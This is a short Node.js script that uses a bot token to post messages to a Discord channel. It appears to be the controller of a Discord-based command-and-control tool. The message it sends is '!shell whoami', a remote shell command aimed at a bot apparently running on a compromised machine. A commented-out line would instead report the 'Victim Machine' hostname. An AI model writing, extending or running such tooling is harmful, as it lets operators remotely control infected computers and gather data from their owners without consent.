const os = require('os');
const fs = require('fs');

const CHANNEL_ID = '1163727185358618665';

async function main() {
  const token = fs
    .readFileSync('token.txt', 'utf8')
    .replace(/(\r\n|\r|\n)/g, '');

  const headers = {
    Authorization: `Bot ${token}`,
    'Content-Type': 'application/json',
  };

  const data = {
      //content: `Victim Machine: ${os.hostname()}`,
      content: `!shell whoami`,
  };

  try {
    const response = await fetch(
      `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`,
      {
        method: 'POST',
        headers,
        body: JSON.stringify(data),
      }
    );

    if (response.status === 200) {
      console.log('Message sent successfully!');
    } else {
      console.log(`Failed to send message. Status code: ${response.status}`);
      console.log(await response.text());
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

if (require.main === module) {
  main();
}
